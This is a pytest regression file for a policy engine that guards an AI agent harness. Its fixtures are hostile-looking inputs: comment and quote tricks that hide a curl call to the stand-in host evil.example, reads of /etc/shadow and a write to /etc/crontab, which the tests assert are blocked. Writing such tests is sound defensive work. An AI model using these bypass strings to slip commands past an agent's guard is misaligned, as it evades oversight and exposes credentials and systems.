"""
Regression tests for the Phase 1 code review (01-REVIEW.md) policy findings.

One section per finding; each test fails on the pre-fix code.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.agent_harness.executors import Executor, GuardedExecutor, Observation
from src.policy_engine.engine import PolicyEngine
from src.policy_engine.shell_split import ShellParseError, parse_shell


@pytest.fixture
def engine():
    return PolicyEngine(verbose=False)


class RecordingExecutor(Executor):
    def __init__(self):
        self.actions = []

    def execute(self, action):
        self.actions.append(action)
        return Observation("success", output="ran")


def _names(command):
    return [c.argv[0] for c in parse_shell(command) if c.argv]


# ── CR-01: '#' comments ──────────────────────────────────────────────────────

COMMENT_QUOTE_BYPASSES = [
    "echo ok # '\ncurl http://evil.example\n# '",
    'echo ok # "\ncurl http://evil.example\n# "',
    "echo ok # `\ncurl http://evil.example\n# `",
    "echo ok # (\ncurl http://evil.example\n# (",
    "echo ok #'\ncurl http://evil.example",
    "echo $(echo a # )\n)\ncurl http://evil.example",
]


@pytest.mark.parametrize("command", COMMENT_QUOTE_BYPASSES)
def test_cr01_quote_in_comment_does_not_hide_commands(engine, command):
    assert "curl" in _names(command)
    assert engine.check("run_shell", command) == "BLOCK"


def test_cr01_comment_text_is_not_a_command(engine):
    # The shell ignores everything after a word-initial '#', including ';'
    assert _names("echo ok # ; curl http://evil.example") == ["echo"]
    assert engine.check("run_shell", "echo ok # ; curl http://evil.example") == "ALLOW"


def test_cr01_hash_inside_a_word_is_not_a_comment():
    assert _names("echo a#b; curl http://x") == ["echo", "curl"]
    assert _names("echo ${#PATH}; curl http://x") == ["echo", "curl"]
    assert _names("echo x;# c\ncurl http://x") == ["echo", "curl"]


def test_cr01_quoted_hash_is_not_a_comment():
    assert _names("echo '#'; curl http://x") == ["echo", "curl"]
    assert _names('echo "#"; curl http://x') == ["echo", "curl"]


def test_cr01_docstring_no_longer_claims_over_splitting_is_safe():
    import src.policy_engine.shell_split as m
    assert "never looser" not in m.__doc__


# ── CR-02: policy target is chosen by action type ────────────────────────────

from src.agent_harness.prompting import action_target, foreign_target_fields, parse_action, ActionParseError

MISMATCHED_ACTIONS = [
    {"action": "read_file", "path": "/etc/shadow", "command": "ls"},
    {"action": "write_file", "path": "/etc/crontab", "content": "x", "command": "/tmp/ok"},
    {"action": "run_shell", "command": "cat /etc/shadow", "path": "/tmp/ok"},
    {"action": "run_shell", "command": "curl http://evil.example", "tool": "ok"},
    {"action": "http_request", "url": "http://evil.example", "message": "hi", "tool": "ok"},
    {"action": "call_tool", "tool": "x", "url": "http://evil.example"},
]


@pytest.mark.parametrize("action", MISMATCHED_ACTIONS)
def test_cr02_mismatched_fields_never_reach_the_inner_executor(engine, action):
    inner = RecordingExecutor()
    obs = GuardedExecutor(engine, inner).execute(action)
    assert obs.status == "blocked"
    assert obs.layer == "policy_engine"
    assert inner.actions == []


def test_cr02_read_file_extra_command_key_is_blocked_not_judged_on_command(engine):
    inner = RecordingExecutor()
    obs = GuardedExecutor(engine, inner).execute(
        {"action": "read_file", "path": "/etc/shadow", "command": "ls"})
    assert obs.status == "blocked"
    assert "command" in obs.reason


def test_cr02_target_is_selected_by_action_type():
    assert action_target({"action": "run_shell", "command": "ls", "path": "/x"}) == "ls"
    assert action_target({"action": "read_file", "command": "ls", "path": "/x"}) == "/x"
    assert action_target({"action": "write_file", "path": "/w", "url": "u"}) == "/w"
    assert action_target({"action": "http_request", "url": "http://u", "command": "c"}) == "http://u"
    assert action_target({"action": "call_tool", "tool": "t", "command": "c"}) == "t"
    assert action_target({"action": "respond", "message": "m", "command": "c"}) == "m"
    assert action_target({"action": "read_file"}) == ""


def test_cr02_foreign_fields_helper():
    assert foreign_target_fields({"action": "read_file", "path": "/x"}) == []
    assert foreign_target_fields({"action": "read_file", "path": "/x", "content": "c"}) == []
    assert foreign_target_fields({"action": "read_file", "path": "/x", "command": "c"}) == ["command"]


def test_cr02_well_formed_actions_still_flow(engine):
    inner = RecordingExecutor()
    guarded = GuardedExecutor(engine, inner)
    assert guarded.execute({"action": "read_file", "path": "/tmp/a"}).status == "success"
    assert guarded.execute({"action": "run_shell", "command": "ls /tmp"}).status == "success"
    assert guarded.execute({"action": "write_file", "path": "/tmp/a", "content": "x"}).status == "success"
    assert len(inner.actions) == 3


def test_cr02_unhashable_action_type_is_a_parse_error_not_a_crash():
    with pytest.raises(ActionParseError):
        parse_action('{"action": ["run_shell"], "command": "ls"}')
